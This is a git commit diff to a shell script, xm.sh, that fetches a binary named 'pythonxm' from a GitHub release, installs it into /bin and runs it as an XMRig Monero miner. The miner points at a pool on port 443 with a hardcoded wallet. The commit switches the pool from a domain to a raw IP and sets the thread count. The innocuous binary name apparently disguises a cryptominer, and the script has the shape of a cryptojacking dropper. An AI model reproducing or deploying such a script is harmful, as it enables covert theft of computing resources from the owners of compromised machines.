dbb52b5aab5a4e74fc3addd2cb9fa8fbc061d795
one10001 <78626503+one10001@users.noreply.github.com>
2021-03-28 17:28:57 +0200

    Update xm.sh

--- xm.sh
+++ xm.sh
@@ -7,7 +7,7 @@ wget https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm
 chmod +x pythonxm
 cp pythonxm /bin/pythonxm
 #pythonxm  -o ehttp.info:443 --coin=XMR -u 44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p  -p x -k -t 8 2> logxm.out 1> logxm.out  &
-pythonxm  -o ehttp.info:443 --coin=XMR -u 44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p  -p x -k
+pythonxm  -o 116.203.206.127:443 --coin=XMR -u 44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p  -p x -k -t 1
 #while [ 1 ]
 #do
 #    echo '#######################################################################################################################################'
